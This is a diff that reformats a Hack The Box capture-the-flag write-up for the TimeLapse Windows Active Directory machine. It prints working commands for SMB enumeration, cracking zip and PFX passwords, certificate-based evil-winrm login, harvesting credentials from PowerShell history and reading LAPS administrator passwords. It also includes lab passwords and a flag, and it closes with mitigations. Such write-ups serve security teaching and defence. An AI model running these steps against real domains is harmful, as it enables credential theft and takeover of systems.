@@ -1,161 +1,135 @@
-# TimeLapse HTB Machine Writeup
-
-## Machine Overview
+TimeLapse HTB Machine Writeup
+Machine Overview
 TimeLapse is an Easy-rated Windows Active Directory machine on Hack The Box that involves discovering credentials, cracking passwords, and abusing group memberships to escalate privileges. The machine demonstrates common AD security issues, especially focusing on certificate-based authentication and LAPS exploitation.
 
-## Reconnaissance
+Reconnaissance
+Initial Nmap Scan
 
-### Initial Nmap Scan
-```bash
 sudo nmap 10.129.227.113 -sV -sC
-```
+Results:
 
-Results showed several open ports indicating an Active Directory environment:
-- Port 53: DNS
-- Port 88: Kerberos
-- Port 139/445: SMB/NetBIOS
-- Port 389/636: LDAP/LDAPS
-- Port 3268/3269: Global Catalog LDAP
-- Hostname: DC01
-- Domain: timelapse.htb
-
-## Initial Access
-
-### SMB Enumeration
+Port 53: DNS
+Port 88: Kerberos
+Port 139/445: SMB/NetBIOS
+Port 389/636: LDAP/LDAPS
+Port 3268/3269: Global Catalog LDAP
+Hostname: DC01
+Domain: timelapse.htb
+Initial Access
+SMB Enumeration
 We enumerated available SMB shares:
-```bash
+
+
 smbclient -L //10.129.227.113 -N
-```
+Found several shares, including a non-standard one called "Shares". Exploring this share:
 
-Found several shares including a non-standard one called "Shares". Exploring this share:
-```bash
+
 smbclient //10.129.227.113/Shares -N
-```
-
 Inside the Shares directory, we found two subdirectories:
-1. Dev - Containing a zip file `winrm_backup.zip`
-2. HelpDesk - Containing LAPS-related documentation
 
-### Cracking Zip File Password
+Dev : Containing a zip file winrm_backup.zip
+HelpDesk : Containing LAPS-related documentation
+Cracking Zip File Password
 Downloaded the zip file and found it was password protected:
-```bash
+
 zip2john winrm_backup.zip > zip.hash
 john zip.hash --wordlist=/path/to/rockyou.txt
-```
+Password: supremelegacy
 
-Password: `supremelegacy`
-
-### Extracting Certificate
-After extracting the zip file (using password `supremelegacy`), we found a PFX file called `legacyy_dev_auth.pfx`.
+Extracting Certificate
+After extracting the zip file (using password supremelegacy), we found a PFX file called legacyy_dev_auth.pfx.
 
 The PFX file was also password protected:
-```bash
+
+
 pfx2john legacyy_dev_auth.pfx > pfx.hash
 john pfx.hash --wordlist=/path/to/rockyou.txt
-```
-
-Password: `thuglegacy`
+Password: thuglegacy
 
 Extracted the certificate to find the common name:
-```bash
+
+
 openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem -passin pass:thuglegacy
 openssl x509 -in cert.pem -noout -subject
-```
+Common Name: Legacyy
 
-Common Name: `Legacyy`
-
-### Certificate Authentication
+Certificate Authentication
 Extracted the private key from the PFX:
-```bash
+
+
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes -passin pass:thuglegacy
-```
-
 Used Evil-WinRM to connect with the certificate:
-```bash
+
+
 evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
-```
+Successfully established a shell as the legacyy user and obtained the user flag:
 
-Successfully established a shell as `legacyy` user and obtained the user flag:
-```
+
 7827527b14dd7e0bac4be2d91574128b
-```
+Privilege Escalation
+Finding Service Account Credentials
+Examined the PowerShell history:
 
-## Privilege Escalation
 
-### Finding Service Account Credentials
-Examining the PowerShell history:
-```powershell
 type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
+Found credentials for the svc_deploy user:
 
-Found credentials for `svc_deploy` user:
-- Username: `svc_deploy`
-- Password: `E3R$Q62^12p7PLlC%KWaxuaV`
+Username: svc_deploy
+Password: E3R$Q62^12p7PLlC%KWaxuaV
+Enumerating User Groups
 
-### Enumerating User Groups
-```powershell
 net user svc_deploy /domain
-```
+Discovered that svc_deploy was a member of the LAPS_Readers group, which can access LAPS-managed passwords.
 
-Discovered that `svc_deploy` was a member of the `LAPS_Readers` group, which can access LAPS managed passwords.
-
-### Exploiting LAPS for Administrator Access
+Exploiting LAPS for Administrator Access
 Connected as the service account:
-```bash
+
+
 evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
-```
-
 Retrieved the LAPS-managed Administrator password:
-```powershell
+
+
 Get-ADComputer DC01 -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd
-```
+Administrator Password: u23wE}v[q+5;n2cT+{71S67$
 
-Administrator password: `u23wE}v[q+5;n2cT+{71S67$`
-
-### Root Access
+Root Access
 Connected as Administrator:
-```bash
+
 evil-winrm -i 10.129.227.113 -u Administrator -p 'u23wE}v[q+5;n2cT+{71S67$' -S
-```
 
-## Key Findings & Security Issues
+# Key findings & security issues
+1. Insecure Password Storage
+PowerShell history files retained cleartext credentials.
+Password-protected archives used weak passwords.
+2. Certificate-Based Authentication
+Private keys and certificates were accessible via SMB shares.
+Certificates were not properly protected with strong passwords.
+3. LAPS Implementation Weaknesses
+Non-privileged service accounts had LAPS password-reading capabilities.
+Excessive group memberships for service accounts.
+4. Excessive SMB Share Access
+Sensitive files were accessible anonymously.
+No access controls were applied to critical backup files.
+5. Defense Evasion via WinRM-S
+WinRM with certificate authentication allowed access without standard password-based detection.
 
-### 1. Insecure Password Storage
-- PowerShell history files retained cleartext credentials
-- Password-protected archives with weak passwords
+# Attack path summary
+Discover and access SMB shares anonymously.
+Download the encrypted backup zip file.
+Crack the zip password using a dictionary attack.
+Extract the PFX certificate file.
+Crack the PFX password using a dictionary attack.
+Use the certificate for WinRM authentication.
+Discover service account credentials in the PowerShell history.
+Leverage the service account's LAPS_Readers group membership.
+Extract the local administrator password using LAPS capabilities.
+Authenticate as the domain administrator.
 
-### 2. Certificate-Based Authentication
-- Private keys and certificates accessible via SMB shares
-- Certificates not properly protected with strong passwords
-
-### 3. LAPS Implementation Weaknesses
-- Non-privileged service account had LAPS password reading capability
-- Excessive group memberships for service accounts
-
-### 4. Excessive SMB Share Access
-- Sensitive files accessible anonymously
-- No access controls on critical backup files
-
-### 5. Defense Evasion via WinRM-S
-- WinRM with certificate authentication allowed access without standard password-based detection
-
-## Attack Path Summary
-1. Discover and access SMB shares anonymously
-2. Download encrypted backup zip file
-3. Crack zip password with dictionary attack
-4. Extract PFX certificate file
-5. Crack PFX password with dictionary attack
-6. Use certificate for WinRM authentication
-7. Discover service account credentials in PowerShell history
-8. Leverage service account's LAPS_Readers group membership
-9. Extract local administrator password using LAPS capabilities
-10. Authenticate as domain administrator
-
-## Mitigation Recommendations
-1. Restrict anonymous SMB access
-2. Implement stronger password policies for archives and certificates
-3. Clear PowerShell history regularly or disable history
-4. Use principle of least privilege for service accounts
-5. Audit LAPS reader groups regularly
-6. Implement proper certificate management
-7. Restrict WinRM access through network segmentation
+# Mitigation recommendations
+Restrict anonymous SMB access.
+Implement stronger password policies for archives and certificates.
+Clear PowerShell history regularly or disable history logging.
+Follow the principle of least privilege for service accounts.
+Audit LAPS_Readers groups regularly.
+Implement proper certificate management practices.
+Restrict WinRM access through network segmentation and stricter authentication mechanisms.
